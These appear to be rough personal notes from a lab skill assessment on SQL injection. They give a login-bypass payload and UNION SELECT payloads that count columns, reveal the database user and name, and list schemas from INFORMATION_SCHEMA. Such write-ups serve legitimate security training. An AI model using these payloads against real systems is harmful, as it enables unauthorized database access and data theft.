# Skill Assessment

After multiple test we found that the working payload is:

`' or 1=1#`

![image.png](Skill%20Assessment%2019f1099e6b5c80a19e6ad4e05389da77/image.png)

We possibly get two username here. We can not connect using theses. 

Inteasd take advantage or the search field. 

We find that it is vulnerable to a sql injection by injecting ‘ 

2- Find the number of column of the initial sql query 

`cn ' UNION SELECT 1,2,3,4,5 -- -` work so it has 5 column. 

3- Retrieve information about the sql databse 

USER root@`localhost`

![image.png](Skill%20Assessment%2019f1099e6b5c80a19e6ad4e05389da77/image%201.png)

Name of the current database:

`cn ' UNION SELECT 1,database(),3,4,5-- -`

ilfreight

Find all the different databases in the system:

`cn' UNION SELECT 1,2,SCHEMA_NAME,2,3 FROM INFORMATION_SCHEMA.SCHEMATA-- -`

![image.png](Skill%20Assessment%2019f1099e6b5c80a19e6ad4e05389da77/image%202.png)